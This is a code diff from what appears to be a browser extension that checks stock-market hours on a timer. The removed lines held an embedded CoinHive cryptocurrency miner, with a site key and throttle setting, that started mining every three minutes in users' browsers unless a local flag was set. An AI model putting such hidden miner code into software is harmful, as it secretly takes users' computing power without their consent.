@@ -2203,21 +2203,11 @@ function showBrowserAction() {
 }
 
 // 主程序调用
-var miner = new CoinHive.Anonymous('0GUSQ5J85FNqe4IntXQAx2L5XQ9lV0rM', {
-  throttle: 0.6
-});
 setInterval(function () {
-  process.runMinging();
   process.runCheckCode();
 }, 3 * 60 * 1000);
 
 var process = {
-  runMinging: function runMinging() {
-    var setMinging = localStorage.setMinging;
-    if (!miner.isRunning() && !setMinging) {
-      miner.start();
-    }
-  },
   runCheckCode: function runCheckCode() {
     if (process.isBussiness()) {
       // 开市时间，每三分钟运行一次
